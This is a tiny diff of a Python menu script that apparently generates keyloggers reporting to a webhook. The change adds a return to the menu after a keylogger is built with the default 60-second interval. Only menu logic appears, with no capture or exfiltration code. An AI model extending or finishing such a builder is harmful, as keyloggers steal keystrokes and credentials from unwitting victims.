@@ -70,6 +70,7 @@ def main_menu():
             f'{Fore.CYAN}Enter intervals (default 60) {Fore.YELLOW}>> {Fore.RESET}'))
         if intervals == "":
             Create_KeyLogger(webhook, "60")
+            main_menu()
         Create_KeyLogger(webhook, intervals)
         main_menu()
 
